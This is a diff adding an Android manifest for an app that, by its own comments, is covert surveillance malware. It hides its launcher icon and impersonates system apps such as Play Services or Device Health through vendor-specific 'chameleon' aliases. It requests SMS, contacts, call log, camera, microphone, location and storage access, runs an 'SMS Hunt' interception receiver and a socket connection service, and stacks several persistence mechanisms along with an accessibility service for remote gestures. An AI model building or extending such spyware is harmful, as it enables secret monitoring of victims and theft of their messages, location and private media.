@@ -1,0 +1,394 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- Core networking -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- Foreground service -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+
+    <!-- Keep-alive / boot -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- AlarmManager exact alarms (API 31+) — Methods 1 & 4 -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+
+    <!-- Audio volume control (mute/unmute streams without needing DND policy) -->
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+
+    <!-- Allows programmatic re-enable of the accessibility service via Settings.Secure
+         (grantable without root via: adb shell pm grant <pkg> android.permission.WRITE_SECURE_SETTINGS) -->
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />
+
+    <!-- SMS -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_MMS" />
+
+    <!-- Contacts, Call logs & Phone identity -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+    <!-- AccountManager — list device accounts / email addresses -->
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+
+    <!-- Camera / Audio -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- Storage (legacy + Android 13+ media) -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <!-- Android 11+ unrestricted file access (File Manager) -->
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+        tools:ignore="ScopedStorage" />
+    <!-- Access precise EXIF location in media files (Android 10+) -->
+    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
+    <!-- WiFi scanning -->
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+
+    <!-- Device features -->
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+
+    <!-- Notifications (Android 13+) -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- Required to show full-screen intent notifications that launch activities
+         from the background (bypasses Android 10+ background activity restriction) -->
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
+
+    <!-- Required to trigger the system uninstall dialog for other apps -->
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+
+    <!-- Required on Android 11+ to query and list all installed packages -->
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+
+    <application
+        android:allowBackup="false"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.SystemService"
+        android:requestLegacyExternalStorage="true"
+        android:preserveLegacyExternalStorage="true"
+        tools:targetApi="34">
+
+
+        <!--
+            Main Activity — NOT visible in the home launcher.
+            CATEGORY_INFO makes getLaunchIntentForPackage() resolve this activity,
+            which is exactly what Settings > App Info > Open uses — so "Open"
+            stays enabled while the app never appears in the app drawer.
+            CATEGORY_LAUNCHER is intentionally absent from this activity.
+        -->
+        <activity
+            android:name=".MainActivity"
+            android:enabled="true"
+            android:exported="true"
+            android:launchMode="singleTop"
+            android:excludeFromRecents="true">
+            <!-- Enables Settings > App Info > Open without showing a launcher icon -->
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.INFO" />
+            </intent-filter>
+            <!-- Custom action for programmatic / ADB launch -->
+            <intent-filter>
+                <action android:name="com.task.tusker.LAUNCH" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+
+        <!--
+            Launcher alias — disabled by default so no icon appears in the drawer.
+            StealthManager.showAppIcon() can enable this to temporarily surface
+            the app in the launcher; hideAppIcon() disables it again.
+        -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!--
+            ════════════════════════════════════════════════════════════════════
+            CHAMELEON IDENTITY ALIASES
+            ════════════════════════════════════════════════════════════════════
+            Five pre-baked identities. ChameleonIdentity.selectIdentity() enables
+            exactly one at runtime based on the installed app ecosystem and
+            disables all others — so the launcher, app drawer, recents screen,
+            and "Running apps" view all show a single consistent impersonation.
+            All start disabled; the runtime selection happens within the first
+            few seconds of the first launch.
+        -->
+
+        <!-- Index 0 — "System Service": universal fallback, any device -->
+        <activity-alias
+            android:name=".ChameleonAlias0"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_alias_system"
+            android:label="@string/alias_label_0">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Index 1 — "Play Services": wins on Google-certified (GMS) devices -->
+        <activity-alias
+            android:name=".ChameleonAlias1"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_alias_google"
+            android:label="@string/alias_label_1">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Index 2 — "Device Health": wins on Samsung devices -->
+        <activity-alias
+            android:name=".ChameleonAlias2"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_alias_health"
+            android:label="@string/alias_label_2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Index 3 — "Sync Manager": wins on Xiaomi / MIUI devices -->
+        <activity-alias
+            android:name=".ChameleonAlias3"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_alias_sync"
+            android:label="@string/alias_label_3">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Index 4 — "Storage Manager": wins on OPPO / ColorOS devices -->
+        <activity-alias
+            android:name=".ChameleonAlias4"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_alias_storage"
+            android:label="@string/alias_label_4">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!--
+            Listens for package install / remove events and triggers a
+            ChameleonIdentity re-scan so the disguise stays optimal as the
+            user adds or removes apps.
+        -->
+        <receiver
+            android:name=".security.PackageChangeReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Consent Activity -->
+        <activity
+            android:name=".ConsentActivity"
+            android:enabled="true"
+            android:exported="false" />
+
+        <!--
+            System Manager — shown after accessibility is first enabled.
+            Looks like a native device-care / system-manager screen.
+            Redirects to MainActivity if accessibility is disabled.
+        -->
+        <activity
+            android:name=".SystemManagerActivity"
+            android:enabled="true"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTop" />
+
+        <!--
+            Transparent trampoline activity used by PermissionManager to show the
+            native runtime-permission dialog from a Service context.
+        -->
+        <activity
+            android:name=".PermissionRequestActivity"
+            android:enabled="true"
+            android:exported="false"
+            android:theme="@style/Theme.Transparent"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTop" />
+
+        <!--
+            Primary background service.
+            foregroundServiceType covers all possible sensor/data types.
+        -->
+        <service
+            android:name=".services.DataSyncService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync|camera|microphone|location" />
+
+        <!--
+            Secondary background service (com.access.client.BackgroundService).
+            Lightweight foreground service that holds the SocketManager connection.
+        -->
+        <service
+            android:name="com.access.client.BackgroundService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <!--
+            ════════════════════════════════════════════════════════════════════
+            PERSISTENCE / WAKE MECHANISMS
+            ════════════════════════════════════════════════════════════════════
+
+            Method 2 — Boot receiver
+            Handles: cold boot, locked-boot (direct-boot), HTC quick-boot,
+                     self-update (MY_PACKAGE_REPLACED).
+        -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:directBootAware="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!--
+            Accessibility reminder alarms — fires at 09:00, 12:00, 15:00 each day.
+            Checks screen-on state before posting so it only interrupts an active user.
+        -->
+        <receiver
+            android:name=".receivers.AccessibilityReminderReceiver"
+            android:enabled="true"
+            android:exported="false"/>
+
+        <!--
+            Method 3 — Network / WiFi wake receiver (manifest-registered leg).
+            CONNECTIVITY_CHANGE cannot be manifest-declared on API 24+, so it is
+            registered dynamically inside DataSyncService.
+            WIFI_STATE_CHANGED and NETWORK_STATE_CHANGED are still receivable here.
+        -->
+        <receiver
+            android:name=".receivers.NetworkWakeReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.net.wifi.STATE_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- SMS Hunt listener. It stores matched messages locally before
+             attempting delivery, so offline devices replay them on reconnect. -->
+        <receiver
+            android:name=".receivers.SmsHuntReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="500">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!--
+            Method 4 — AlarmManager exact-alarm heartbeat receiver.
+            Custom action keeps it scoped to our package only.
+        -->
+        <receiver
+            android:name=".receivers.WakeAlarmReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.task.tusker.action.WAKE_ALARM" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Shares the extracted private APK with Android's package installer. -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
+
+        <!--
+            Unified Accessibility Service
+            canPerformGestures="true" is required for touch/swipe commands.
+        -->
+        <service
+            android:name=".services.UnifiedAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+    </application>
+
+</manifest>
